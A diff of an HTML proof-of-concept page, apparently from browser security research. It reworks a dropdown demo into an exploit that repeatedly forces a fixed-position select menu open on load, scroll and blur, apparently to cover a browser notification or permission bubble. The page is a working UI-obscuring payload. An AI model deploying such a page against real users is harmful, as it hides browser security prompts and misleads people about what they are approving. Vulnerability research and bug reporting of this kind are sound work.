@@ -1,55 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Dropdown PoC</title>
+  <title></title>
 
   <style>
     body {
       margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;  /* center horizontally */
-      align-items: flex-start;  /* move to top */
-      padding-top: 20px;        /* little spacing from top */
-      background: #111;
-      color: white;
-      font-family: Arial;
+      height: 5000px; /* simulate VERY long page like original <br> spam */
     }
 
-    select {
-      padding: 10px;
-      font-size: 16px;
+    #dropdown {
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 9999;
     }
   </style>
 
-  <script>
-    function triggerDropdown() {
-      setTimeout(function () {
-        var dropdown = document.getElementById('dropdown');
+  <script type='text/javascript'>
+    function coverBubble() { 
+      setTimeout(function() {
+        window.scroll(0, 120);
 
-        var event = document.createEvent('MouseEvents');
+        var dropdown = document.getElementById('dropdown');
+        var event;
+
+        event = document.createEvent('MouseEvents');
         event.initMouseEvent('mousedown', true, true, window);
 
         dropdown.dispatchEvent(event);
-      }, 200);
+      }, 100);
     }
+
+    document.addEventListener("scroll", coverBubble);
 
     function loaded() {
-      triggerDropdown();
+      coverBubble();
     }
-
-    document.addEventListener("scroll", triggerDropdown);
   </script>
 </head>
 
 <body onload="loaded()">
 
-  <select id="dropdown" onblur="triggerDropdown()">
-    <option value="0">first item</option>
-    <option value="1">looooooooooooooooooooooooooooooooooooooooooooong item</option>
-    <option value="2">item</option>
-    <option value="3">item</option>
-  </select>
+<select class="input_panel" id="dropdown" onblur="coverBubble()">
+  <option value="0">first item</option>
+  <option value="1">looooooooooooooooooooooooooooooooooooooooooooong item</option>
+  <option value="2">item</option>
+  <option value="3">item</option>
+</select>
 
 </body>
 </html>
